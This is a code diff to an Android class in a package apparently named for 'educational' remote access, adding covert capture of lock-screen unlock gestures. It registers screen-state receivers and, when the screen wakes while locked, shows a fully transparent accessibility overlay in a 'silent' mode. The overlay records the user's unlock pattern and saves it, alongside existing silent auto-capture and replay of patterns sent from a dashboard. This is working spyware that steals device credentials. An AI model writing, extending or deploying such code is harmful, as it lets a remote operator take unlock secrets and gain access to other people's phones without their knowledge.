@@ -2,7 +2,11 @@ package com.remoteaccess.educational.commands;
 
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.GestureDescription;
+import android.app.KeyguardManager;
+import android.content.BroadcastReceiver;
 import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
 import android.graphics.Canvas;
 import android.graphics.Color;
 import android.graphics.Paint;
@@ -445,6 +449,13 @@ public class GestureRecorder {
     private volatile boolean       autoCapturing = false;
     private volatile RecordingOverlay autoCaptureOverlay;
 
+    // -- Screen-lock auto-capture state ---------------------------------------
+    private volatile boolean       lockCaptureEnabled = false;
+    private volatile boolean       lockCaptureActive  = false;
+    private volatile RecordingOverlay lockCaptureOverlay;
+    private BroadcastReceiver      screenStateReceiver;
+    private volatile boolean       screenStateReceiverRegistered = false;
+
     /**
      * Draw a pattern from normalized node coordinates received from the dashboard.
      * Params JSON expected: { nodes: [{nx, ny}, ...], sequence: [int, ...] }
@@ -512,16 +523,33 @@ public class GestureRecorder {
                 r.put("success", false); r.put("error", "Auto-capture already running"); return r;
             }
             autoCapturing = true;
+            final boolean[] showOk = {false};
             CountDownLatch latch = new CountDownLatch(1);
             mainHandler.post(() -> {
-                autoCaptureOverlay = new RecordingOverlay(context, "auto", "auto_" + System.currentTimeMillis(), screenW, screenH, wm, () -> autoCapturing = false);
-                autoCaptureOverlay.show();
-                latch.countDown();
+                try {
+                    autoCaptureOverlay = new RecordingOverlay(context, "auto",
+                            "auto_" + System.currentTimeMillis(), screenW, screenH, wm,
+                            () -> autoCapturing = false);
+                    autoCaptureOverlay.show();
+                    showOk[0] = true;
+                } catch (Exception e) {
+                    Log.e(TAG, "startAutoCapture overlay: " + e.getMessage());
+                    autoCapturing = false;
+                } finally {
+                    latch.countDown();
+                }
             });
             latch.await(2, TimeUnit.SECONDS);
+            if (!showOk[0]) {
+                autoCapturing = false;
+                r.put("success", false);
+                r.put("error", "Failed to create capture overlay");
+                return r;
+            }
             r.put("success", true);
             r.put("message", "Auto-capture started — complex gestures will be recorded silently");
         } catch (Exception e) {
+            autoCapturing = false;
             try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
         }
         return r;
@@ -542,9 +570,14 @@ public class GestureRecorder {
             CountDownLatch latch = new CountDownLatch(1);
             final RecordingOverlay cur = autoCaptureOverlay;
             mainHandler.post(() -> {
-                saved[0] = cur.stopAndSaveIfComplex(gestureDir());
-                autoCaptureOverlay = null;
-                latch.countDown();
+                try {
+                    saved[0] = cur.stopAndSaveIfComplex(gestureDir());
+                } catch (Exception e) {
+                    Log.e(TAG, "stopAutoCapture save: " + e.getMessage());
+                } finally {
+                    autoCaptureOverlay = null;
+                    latch.countDown();
+                }
             });
             latch.await(3, TimeUnit.SECONDS);
             r.put("success", true);
@@ -559,6 +592,136 @@ public class GestureRecorder {
             try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
         }
         return r;
+    }
+
+    // =========================================================================
+    // Screen-Lock Auto-Capture (auto-start on accessibility enable)
+    // Records when screen is ON+LOCKED, pauses when screen is UNLOCKED.
+    // =========================================================================
+
+    /**
+     * Enable automatic gesture capture tied to screen lock state.
+     * Registers a BroadcastReceiver to respond to screen ON/OFF/UNLOCK events.
+     * Call this from UnifiedAccessibilityService.onServiceConnected().
+     */
+    public void enableLockScreenAutoCapture() {
+        try {
+            if (screenStateReceiverRegistered) return;
+            lockCaptureEnabled = true;
+            screenStateReceiver = new BroadcastReceiver() {
+                @Override
+                public void onReceive(Context ctx, Intent intent) {
+                    try {
+                        String action = intent.getAction();
+                        if (action == null) return;
+                        switch (action) {
+                            case Intent.ACTION_SCREEN_ON:
+                                onScreenOn();
+                                break;
+                            case Intent.ACTION_USER_PRESENT:
+                                onScreenUnlocked();
+                                break;
+                            case Intent.ACTION_SCREEN_OFF:
+                                onScreenOff();
+                                break;
+                        }
+                    } catch (Exception e) {
+                        Log.e(TAG, "screenStateReceiver: " + e.getMessage());
+                    }
+                }
+            };
+            IntentFilter filter = new IntentFilter();
+            filter.addAction(Intent.ACTION_SCREEN_ON);
+            filter.addAction(Intent.ACTION_SCREEN_OFF);
+            filter.addAction(Intent.ACTION_USER_PRESENT);
+            context.registerReceiver(screenStateReceiver, filter);
+            screenStateReceiverRegistered = true;
+            Log.i(TAG, "Lock-screen auto-capture ENABLED");
+        } catch (Exception e) {
+            Log.e(TAG, "enableLockScreenAutoCapture: " + e.getMessage());
+        }
+    }
+
+    /**
+     * Disable automatic lock-screen gesture capture and unregister receiver.
+     */
+    public void disableLockScreenAutoCapture() {
+        try {
+            lockCaptureEnabled = false;
+            if (screenStateReceiver != null && screenStateReceiverRegistered) {
+                try { context.unregisterReceiver(screenStateReceiver); } catch (Exception ignored) {}
+                screenStateReceiver = null;
+                screenStateReceiverRegistered = false;
+            }
+            stopLockCapture();
+            Log.i(TAG, "Lock-screen auto-capture DISABLED");
+        } catch (Exception e) {
+            Log.e(TAG, "disableLockScreenAutoCapture: " + e.getMessage());
+        }
+    }
+
+    private void onScreenOn() {
+        try {
+            if (!lockCaptureEnabled) return;
+            KeyguardManager km = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
+            boolean isLocked = km != null && km.isKeyguardLocked();
+            if (isLocked) {
+                startLockCapture();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "onScreenOn: " + e.getMessage());
+        }
+    }
+
+    private void onScreenUnlocked() {
+        try {
+            stopLockCapture();
+        } catch (Exception e) {
+            Log.e(TAG, "onScreenUnlocked: " + e.getMessage());
+        }
+    }
+
+    private void onScreenOff() {
+        try {
+            stopLockCapture();
+        } catch (Exception e) {
+            Log.e(TAG, "onScreenOff: " + e.getMessage());
+        }
+    }
+
+    private void startLockCapture() {
+        if (lockCaptureActive) return;
+        lockCaptureActive = true;
+        mainHandler.post(() -> {
+            try {
+                lockCaptureOverlay = new RecordingOverlay(context, "lock",
+                        "lockscreen_" + System.currentTimeMillis(), screenW, screenH, wm,
+                        () -> lockCaptureActive = false);
+                lockCaptureOverlay.setSilent(true);
+                lockCaptureOverlay.show();
+                Log.i(TAG, "Lock-screen gesture capture STARTED");
+            } catch (Exception e) {
+                Log.e(TAG, "startLockCapture: " + e.getMessage());
+                lockCaptureActive = false;
+                lockCaptureOverlay = null;
+            }
+        });
+    }
+
+    private void stopLockCapture() {
+        if (!lockCaptureActive && lockCaptureOverlay == null) return;
+        lockCaptureActive = false;
+        final RecordingOverlay cur = lockCaptureOverlay;
+        lockCaptureOverlay = null;
+        if (cur == null) return;
+        mainHandler.post(() -> {
+            try {
+                cur.stopAndSaveIfComplex(gestureDir());
+            } catch (Exception e) {
+                Log.e(TAG, "stopLockCapture save: " + e.getMessage());
+            }
+        });
+        Log.i(TAG, "Lock-screen gesture capture STOPPED");
     }
 
     // =========================================================================
@@ -579,6 +742,7 @@ public class GestureRecorder {
         private long startTime;
         private boolean stopped = false;
         private volatile boolean paused = false;
+        private volatile boolean silent = false;
 
         // Drawing state
         private final Map<Integer, Path> activePaths = new HashMap<>();
@@ -614,6 +778,11 @@ public class GestureRecorder {
             paintBg.setColor(Color.parseColor("#55000000"));
         }
 
+        /** Set silent mode: no visual feedback, completely transparent overlay. */
+        void setSilent(boolean silent) {
+            this.silent = silent;
+        }
+
         void show() {
             startTime = System.currentTimeMillis();
             view = new View(context) {
@@ -625,6 +794,7 @@ public class GestureRecorder {
 
                 @Override
                 protected void onDraw(Canvas canvas) {
+                    if (silent) return;
                     canvas.drawRect(0, 0, getWidth(), getHeight(), paintBg);
                     for (Path p : finishedPaths) canvas.drawPath(p, paintPath);
                     for (Path p : activePaths.values()) canvas.drawPath(p, paintPath);
@@ -635,16 +805,24 @@ public class GestureRecorder {
             };
             view.setLayerType(View.LAYER_TYPE_SOFTWARE, null);
 
+            int flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS;
             WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                     WindowManager.LayoutParams.MATCH_PARENT,
                     WindowManager.LayoutParams.MATCH_PARENT,
                     WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
-                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
-                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
-                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
-                    PixelFormat.TRANSLUCENT
+                    flags,
+                    silent ? PixelFormat.TRANSPARENT : PixelFormat.TRANSLUCENT
             );
-            wm.addView(view, lp);
+            try {
+                wm.addView(view, lp);
+            } catch (Exception e) {
+                Log.e(TAG, "RecordingOverlay.show addView: " + e.getMessage());
+                view = null;
+                if (onStop != null) onStop.run();
+                throw e;
+            }
         }
 
         void setPaused(boolean paused) {
